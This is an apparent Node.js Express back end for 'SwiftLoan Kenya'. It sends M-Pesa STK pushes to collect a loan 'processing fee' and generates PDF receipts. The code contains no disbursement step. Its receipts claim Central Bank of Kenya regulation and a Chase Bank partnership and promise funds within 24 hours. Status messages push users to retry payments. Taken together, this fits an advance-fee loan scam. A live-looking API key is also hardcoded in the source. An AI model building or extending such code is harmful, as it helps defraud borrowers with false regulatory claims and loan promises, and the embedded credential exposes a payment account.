const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const PDFDocument = require("pdfkit");

const app = express();
const PORT = process.env.PORT || 5000;

const receiptsFile = path.join(__dirname, "receipts.json");

const SWIFT_API_KEY = "241927b2b3d407473aaa0adaa6959adb3096c7e0634da4f157544226b83bcbb0";
const SWIFT_CHANNEL_ID = "000260";

app.use(bodyParser.json());
app.use(
  cors({
    origin: process.env.CORS_ORIGIN || "https://smartfundke.onrender.com"
  })
);

app.use(express.static(__dirname));

function readReceipts() {
  if (!fs.existsSync(receiptsFile)) return {};
  return JSON.parse(fs.readFileSync(receiptsFile));
}

function writeReceipts(data) {
  fs.writeFileSync(receiptsFile, JSON.stringify(data, null, 2));
}

function formatPhone(phone) {
  const digits = phone.replace(/\D/g, "");
  if (digits.length === 9 && digits.startsWith("7")) return "254" + digits;
  if (digits.length === 10 && digits.startsWith("07"))
    return "254" + digits.substring(1);
  if (digits.length === 12 && digits.startsWith("254")) return digits;
  return null;
}

app.post("/pay", async (req, res) => {
  try {
    const { phone, amount, loan_amount } = req.body;
    const formattedPhone = formatPhone(phone);

    if (!formattedPhone) {
      return res.status(400).json({ success: false, error: "Invalid phone format" });
    }
    if (!amount || amount < 1) {
      return res.status(400).json({ success: false, error: "Amount must be >= 1" });
    }

    if (!SWIFT_API_KEY) {
      return res.status(500).json({ 
        success: false, 
        error: "Server configuration error: API key not set" 
      });
    }

    const reference = "ORDER-" + Date.now();

    const payload = {
      amount: Math.round(amount),
      phone_number: formattedPhone,
      channel_id: parseInt(SWIFT_CHANNEL_ID),
      external_reference: reference,
      customer_name: "Customer",
      callback_url: `${process.env.CALLBACK_BASE_URL || 'https://swiftloan-back.onrender.com'}/callback`
    };

    const url = "https://swiftwallet.co.ke/pay-app/v3/stk-initiate/";
    
    console.log("Initiating v3 STK push:", { reference, phone: formattedPhone, amount });
    
    const resp = await axios.post(url, payload, {
      headers: {
        Authorization: `Bearer ${SWIFT_API_KEY}`,
        "Content-Type": "application/json"
      }
    });

    console.log("SwiftWallet v3 response:", resp.data);

    if (resp.data.success && resp.data.status === "INITIATED") {
      const receiptData = {
        reference,
        transaction_id: resp.data.transaction_id || null,
        checkout_request_id: resp.data.checkout_request_id || null,
        merchant_request_id: resp.data.merchant_request_id || null,
        transaction_code: null,
        amount: Math.round(amount),
        loan_amount: loan_amount || "50000",
        phone: formattedPhone,
        customer_name: "N/A",
        status: "pending",
        status_note: `STK push sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete the fee payment and loan disbursement. Withdrawal started.....`,
        timestamp: new Date().toISOString()
      };

      let receipts = readReceipts();
      receipts[reference] = receiptData;
      writeReceipts(receipts);

      res.json({
        success: true,
        message: resp.data.message || "STK push sent, check your phone",
        reference,
        receipt: receiptData
      });
    } else {
      const failedReceiptData = {
        reference,
        transaction_id: resp.data.transaction_id || null,
        checkout_request_id: resp.data.checkout_request_id || null,
        merchant_request_id: resp.data.merchant_request_id || null,
        transaction_code: null,
        amount: Math.round(amount),
        loan_amount: loan_amount || "50000",
        phone: formattedPhone,
        customer_name: "N/A",
        status: "stk_failed",
        status_note: resp.data.error || "STK push failed to send. Please try again or contact support.",
        timestamp: new Date().toISOString()
      };

      let receipts = readReceipts();
      receipts[reference] = failedReceiptData;
      writeReceipts(receipts);

      res.status(400).json({
        success: false,
        error: resp.data.error || "Failed to initiate payment",
        receipt: failedReceiptData
      });
    }
  } catch (err) {
    console.error("Payment initiation error:", {
      message: err.message,
      status: err.response?.status,
      data: err.response?.data
    });

    const reference = "ORDER-" + Date.now();
    const { phone, amount, loan_amount } = req.body;
    const formattedPhone = formatPhone(phone);

    let errorMessage = "System error occurred. Please try again later.";
    let errorDetails = err.response?.data;

    if (errorDetails) {
      if (errorDetails.error_code === "RATE_LIMIT_EXCEEDED") {
        errorMessage = errorDetails.details?.message || "Rate limit exceeded. Please try again later.";
      } else if (errorDetails.error_code === "PERSONAL_KYC_VERIFICATION_REQUIRED") {
        errorMessage = "Account verification required. Please contact support.";
      } else if (errorDetails.error_code === "CHANNEL_KYC_VERIFICATION_REQUIRED") {
        errorMessage = "Channel verification required. Please contact support.";
      } else if (errorDetails.error_code === "INSUFFICIENT_SERVICE_BALANCE") {
        errorMessage = "Service temporarily unavailable. Please try again later.";
      } else if (errorDetails.error) {
        errorMessage = errorDetails.error;
      }
    }

    const errorReceiptData = {
      reference,
      transaction_id: null,
      checkout_request_id: null,
      merchant_request_id: null,
      transaction_code: null,
      amount: amount ? Math.round(amount) : null,
      loan_amount: loan_amount || "50000",
      phone: formattedPhone,
      customer_name: "N/A",
      status: "error",
      status_note: errorMessage,
      timestamp: new Date().toISOString()
    };

    let receipts = readReceipts();
    receipts[reference] = errorReceiptData;
    writeReceipts(receipts);

    res.status(500).json({
      success: false,
      error: errorMessage,
      receipt: errorReceiptData
    });
  }
});

app.post("/callback", (req, res) => {
  console.log("v3 Callback received:", req.body);

  const data = req.body;
  const ref = data.external_reference;
  let receipts = readReceipts();
  const existingReceipt = receipts[ref] || {};

  const status = data.status?.toLowerCase();
  const resultCode = data.result?.ResultCode;

  const customerName =
    data.result?.Name ||
    [data.result?.FirstName, data.result?.MiddleName, data.result?.LastName].filter(Boolean).join(" ") ||
    existingReceipt.customer_name ||
    "N/A";

  if ((status === "completed" && data.success === true) || resultCode === 0) {
    receipts[ref] = {
      ...existingReceipt,
      reference: ref,
      transaction_id: data.transaction_id,
      checkout_request_id: data.checkout_request_id || existingReceipt.checkout_request_id,
      merchant_request_id: data.merchant_request_id || existingReceipt.merchant_request_id,
      transaction_code: data.result?.MpesaReceiptNumber || null,
      amount: data.result?.Amount || existingReceipt.amount,
      loan_amount: existingReceipt.loan_amount || "50000",
      phone: data.result?.Phone || existingReceipt.phone,
      customer_name: customerName,
      status: "processing",
      status_note: `✅ Your fee payment has been received and verified.  
Loan Reference: ${ref}.  
Your loan is now in the final processing stage and funds are reserved for disbursement.  
You will receive the amount in your selected account within 24 hours, an sms will be sent to you.
Thank you for choosing SwiftLoan Kenya.`,
      timestamp: data.timestamp || new Date().toISOString(),
    };
  } else {
    let statusNote = data.result?.ResultDesc || "Payment failed or was cancelled.";

    switch (data.result?.ResultCode) {
      case 1032:
        statusNote = "You cancelled the payment request on your phone. Please try again to complete your loan withdrawal. If you had an issue contact us using the chat blue button at the left side of your phone screen for quick help.";
        break;

      case 1037:
        statusNote = "The request timed out. You did not enter your M-Pesa PIN to complete withdrawal request. Please try again.";
        break;

      case 2001:
        statusNote = "Payment failed due to insufficient M-Pesa balance. Please top up and try to withdraw again.";
        break;

      default:
        break;
    }

    receipts[ref] = {
      ...existingReceipt,
      reference: ref,
      transaction_id: data.transaction_id,
      checkout_request_id: data.checkout_request_id || existingReceipt.checkout_request_id,
      merchant_request_id: data.merchant_request_id || existingReceipt.merchant_request_id,
      transaction_code: null,
      amount: data.result?.Amount || existingReceipt.amount || null,
      loan_amount: existingReceipt.loan_amount || "50000",
      phone: data.result?.Phone || existingReceipt.phone || null,
      customer_name: customerName,
      status: "cancelled",
      status_note: statusNote,
      timestamp: data.timestamp || new Date().toISOString(),
    };
  }

  writeReceipts(receipts);

  res.json({ ResultCode: 0, ResultDesc: "Success" });
});

app.get("/receipt/:reference", (req, res) => {
  const receipts = readReceipts();
  const receipt = receipts[req.params.reference];

  if (!receipt) {
    return res.status(404).json({ success: false, error: "Receipt not found" });
  }

  res.json({ success: true, receipt });
});

app.get("/receipt/:reference/pdf", (req, res) => {
  const receipts = readReceipts();
  const receipt = receipts[req.params.reference];

  if (!receipt) {
    return res.status(404).json({ success: false, error: "Receipt not found" });
  }

  generateReceiptPDF(receipt, res);
});

function generateReceiptPDF(receipt, res) {
  res.setHeader("Content-Type", "application/pdf");
  res.setHeader("Content-Disposition", `attachment; filename=receipt-${receipt.reference}.pdf`);

  const doc = new PDFDocument({ margin: 40, size: 'A4' });
  doc.pipe(res);

  const pageWidth = doc.page.width;
  const pageHeight = doc.page.height;
  const margin = 40;
  const contentWidth = pageWidth - (margin * 2);

  let primaryColor = "#225AAC";
  let statusColor = "#10b981";
  let statusText = "COMPLETED";
  let statusIcon = "✓";

  if (receipt.status === "success" || receipt.status === "processing") {
    statusColor = "#10b981";
    statusText = receipt.status === "processing" ? "PROCESSING" : "COMPLETED";
    statusIcon = receipt.status === "processing" ? "⏳" : "✓";
  } else if (["cancelled", "error", "stk_failed"].includes(receipt.status)) {
    statusColor = "#ef4444";
    statusText = "FAILED";
    statusIcon = "✗";
  } else if (receipt.status === "pending") {
    statusColor = "#f59e0b";
    statusText = "PENDING";
    statusIcon = "⏳";
  } else if (receipt.status === "loan_released") {
    statusColor = "#10b981";
    statusText = "DISBURSED";
    statusIcon = "✓";
  }

  doc.rect(0, 0, pageWidth, 140).fill(primaryColor);
  
  doc.fillColor("white").fontSize(28).font('Helvetica-Bold')
    .text("SWIFTLOAN KENYA", margin, 30, { align: "center" });
  doc.fontSize(12).font('Helvetica')
    .text("Official Loan Withdrawal Receipt", margin, 62, { align: "center" });
  doc.fontSize(10).opacity(0.8)
    .text("Regulated by Central Bank of Kenya  |  CHASE BANK Partner", margin, 82, { align: "center" });
  doc.fontSize(11).opacity(1).font('Helvetica-Bold')
    .text("Account: STNYGP", margin, 105, { align: "center" });
  doc.opacity(1);

  const statusBoxY = 160;
  const statusBoxHeight = 50;
  doc.roundedRect(margin, statusBoxY, contentWidth, statusBoxHeight, 8).fill(statusColor);
  doc.fillColor("white").fontSize(20).font('Helvetica-Bold')
    .text(`${statusIcon}  ${statusText}`, margin, statusBoxY + 15, { align: "center" });

  let currentY = statusBoxY + statusBoxHeight + 30;

  doc.roundedRect(margin, currentY, contentWidth, 220, 5).lineWidth(1).stroke("#e5e7eb");
  
  doc.fillColor(primaryColor).fontSize(14).font('Helvetica-Bold')
    .text("TRANSACTION DETAILS", margin + 15, currentY + 15);
  
  doc.moveTo(margin + 15, currentY + 35).lineTo(margin + contentWidth - 15, currentY + 35).stroke("#e5e7eb");

  const detailsStartY = currentY + 50;
  const labelX = margin + 20;
  const valueX = margin + 180;
  const lineHeight = 22;

  const details = [
    ["Account Number", "STNYGP"],
    ["Reference Number", receipt.reference || "N/A"],
    ["Transaction ID", receipt.transaction_id || "N/A"],
    ["M-Pesa Receipt", receipt.transaction_code || "Pending"],
    ["Processing Fee", `KES ${Number(receipt.amount).toLocaleString()}`],
    ["Loan Amount", `KES ${Number(receipt.loan_amount).toLocaleString()}`],
    ["Phone Number", receipt.phone || "N/A"],
    ["Customer Name", receipt.customer_name || "N/A"],
  ];

  details.forEach(([label, value], index) => {
    const y = detailsStartY + (index * lineHeight);
    doc.fillColor("#6b7280").fontSize(10).font('Helvetica').text(label, labelX, y);
    doc.fillColor("#111827").fontSize(10).font('Helvetica-Bold').text(value, valueX, y);
  });

  currentY = detailsStartY + (details.length * lineHeight) + 30;

  doc.roundedRect(margin, currentY, contentWidth, 60, 5).fill("#f3f4f6");
  doc.fillColor("#6b7280").fontSize(9).font('Helvetica')
    .text("Date & Time", margin + 20, currentY + 15);
  doc.fillColor("#111827").fontSize(11).font('Helvetica-Bold')
    .text(new Date(receipt.timestamp).toLocaleString('en-KE', { 
      weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit'
    }), margin + 20, currentY + 32);

  currentY += 80;

  if (receipt.status_note) {
    const noteBoxHeight = 80;
    let noteBgColor = "#f0fdf4";
    let noteBorderColor = "#86efac";
    let noteTextColor = "#166534";
    
    if (["cancelled", "error", "stk_failed"].includes(receipt.status)) {
      noteBgColor = "#fef2f2";
      noteBorderColor = "#fca5a5";
      noteTextColor = "#991b1b";
    } else if (receipt.status === "pending") {
      noteBgColor = "#fffbeb";
      noteBorderColor = "#fcd34d";
      noteTextColor = "#92400e";
    }

    doc.roundedRect(margin, currentY, contentWidth, noteBoxHeight, 5).fill(noteBgColor);
    doc.roundedRect(margin, currentY, contentWidth, noteBoxHeight, 5).lineWidth(1).stroke(noteBorderColor);
    
    doc.fillColor(noteTextColor).fontSize(9).font('Helvetica-Bold')
      .text("STATUS NOTE", margin + 15, currentY + 12);
    doc.fillColor(noteTextColor).fontSize(9).font('Helvetica')
      .text(receipt.status_note, margin + 15, currentY + 28, { 
        width: contentWidth - 30, 
        lineGap: 2 
      });
    
    currentY += noteBoxHeight + 20;
  }

  if (["cancelled", "error", "stk_failed"].includes(receipt.status)) {
    doc.roundedRect(margin, currentY, contentWidth, 45, 5).fill(primaryColor);
    doc.fillColor("white").fontSize(10).font('Helvetica-Bold')
      .text("↻ RETRY AVAILABLE", margin, currentY + 8, { align: "center" });
    doc.fontSize(9).font('Helvetica')
      .text("Visit our app to retry this withdrawal", margin, currentY + 26, { align: "center" });
    currentY += 60;
  }

  doc.roundedRect(margin, currentY, contentWidth, 85, 5).fill("#f8fafc");
  doc.roundedRect(margin, currentY, contentWidth, 85, 5).lineWidth(1).stroke("#cbd5e1");
  
  doc.fillColor(primaryColor).fontSize(11).font('Helvetica-Bold')
    .text("IMPORTANT INFORMATION", margin + 15, currentY + 10);
  
  doc.fillColor("#475569").fontSize(8).font('Helvetica')
    .text("• Your loan account number: STNYGP (CHASE BANK)", margin + 15, currentY + 28)
    .text("• Loan disbursement will be processed within 24 hours after fee confirmation", margin + 15, currentY + 42)
    .text("• For any queries, contact support via the chat button or call +254 700 000 000", margin + 15, currentY + 56)
    .text("• Keep this receipt for your records - Reference: " + receipt.reference, margin + 15, currentY + 70);

  currentY += 100;

  const footerY = pageHeight - 80;
  doc.moveTo(margin, footerY).lineTo(pageWidth - margin, footerY).stroke("#e5e7eb");
  
  doc.fillColor("#9ca3af").fontSize(8).font('Helvetica')
    .text("SwiftLoan Kenya  |  Licensed by Central Bank of Kenya", margin, footerY + 15, { align: "center" });
  doc.text("For support: support@swiftloan.ke  |  +254 700 000 000", margin, footerY + 30, { align: "center" });
  doc.text(`© ${new Date().getFullYear()} SwiftLoan Kenya. All rights reserved.`, margin, footerY + 45, { align: "center" });

  doc.save();
  doc.fillColor(statusColor).opacity(0.08).fontSize(80).font('Helvetica-Bold')
    .rotate(-35, { origin: [pageWidth / 2, pageHeight / 2] })
    .text(statusText, 100, pageHeight / 2 - 40, { align: "center" });
  doc.restore();

  doc.end();
}

app.get("/check-withdrawal/:phone", (req, res) => {
  const phone = formatPhone(req.params.phone);
  if (!phone) {
    return res.status(400).json({ success: false, error: "Invalid phone format" });
  }

  const receipts = readReceipts();
  const userReceipts = Object.values(receipts)
    .filter(r => r.phone === phone)
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

  if (userReceipts.length === 0) {
    return res.json({ 
      success: true, 
      has_previous: false,
      message: "No previous withdrawals found"
    });
  }

  const lastReceipt = userReceipts[0];
  const canRetry = ["cancelled", "error", "stk_failed"].includes(lastReceipt.status);

  res.json({
    success: true,
    has_previous: true,
    last_withdrawal: {
      reference: lastReceipt.reference,
      status: lastReceipt.status,
      amount: lastReceipt.amount,
      loan_amount: lastReceipt.loan_amount,
      timestamp: lastReceipt.timestamp,
      status_note: lastReceipt.status_note,
      can_retry: canRetry
    },
    total_withdrawals: userReceipts.length
  });
});

app.post("/retry/:reference", async (req, res) => {
  const receipts = readReceipts();
  const originalReceipt = receipts[req.params.reference];

  if (!originalReceipt) {
    return res.status(404).json({ success: false, error: "Original withdrawal not found" });
  }

  if (!["cancelled", "error", "stk_failed"].includes(originalReceipt.status)) {
    return res.status(400).json({ 
      success: false, 
      error: "This withdrawal cannot be retried",
      current_status: originalReceipt.status
    });
  }

  try {
    const reference = "RETRY-" + Date.now();

    const payload = {
      amount: Math.round(originalReceipt.amount),
      phone_number: originalReceipt.phone,
      channel_id: parseInt(SWIFT_CHANNEL_ID),
      external_reference: reference,
      customer_name: originalReceipt.customer_name || "Customer",
      callback_url: `${process.env.CALLBACK_BASE_URL || 'https://swiftloan-back.onrender.com'}/callback`
    };

    const url = "https://swiftwallet.co.ke/pay-app/v3/stk-initiate/";
    
    console.log("Retrying withdrawal:", { 
      original_reference: req.params.reference,
      new_reference: reference, 
      phone: originalReceipt.phone, 
      amount: originalReceipt.amount 
    });
    
    const resp = await axios.post(url, payload, {
      headers: {
        Authorization: `Bearer ${SWIFT_API_KEY}`,
        "Content-Type": "application/json"
      }
    });

    console.log("Retry SwiftWallet v3 response:", resp.data);

    if (resp.data.success && resp.data.status === "INITIATED") {
      const receiptData = {
        reference,
        original_reference: req.params.reference,
        transaction_id: resp.data.transaction_id || null,
        checkout_request_id: resp.data.checkout_request_id || null,
        merchant_request_id: resp.data.merchant_request_id || null,
        transaction_code: null,
        amount: Math.round(originalReceipt.amount),
        loan_amount: originalReceipt.loan_amount,
        phone: originalReceipt.phone,
        customer_name: originalReceipt.customer_name || "N/A",
        status: "pending",
        status_note: `↻ Retry initiated for failed withdrawal ${req.params.reference}. STK push sent to ${originalReceipt.phone}. Please enter your M-Pesa PIN.`,
        timestamp: new Date().toISOString(),
        is_retry: true
      };

      receipts[reference] = receiptData;
      writeReceipts(receipts);

      res.json({
        success: true,
        message: resp.data.message || "Retry STK push sent, check your phone",
        reference,
        original_reference: req.params.reference,
        receipt: receiptData
      });
    } else {
      res.status(400).json({
        success: false,
        error: resp.data.error || "Retry failed to initiate",
        original_reference: req.params.reference
      });
    }
  } catch (err) {
    console.error("Retry error:", err.response?.data || err.message);
    res.status(500).json({
      success: false,
      error: err.response?.data?.error || "Retry failed. Please try again later.",
      original_reference: req.params.reference
    });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "loan-withdrawal.html"));
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 SwiftLoan server (v3 API) running on port ${PORT}`);
  console.log(`📍 API Base URL: http://localhost:${PORT}`);
  console.log(`🔑 API Key configured: ${SWIFT_API_KEY ? 'Yes' : 'No (WARNING: Set SWIFT_API_KEY env var)'}`);
});
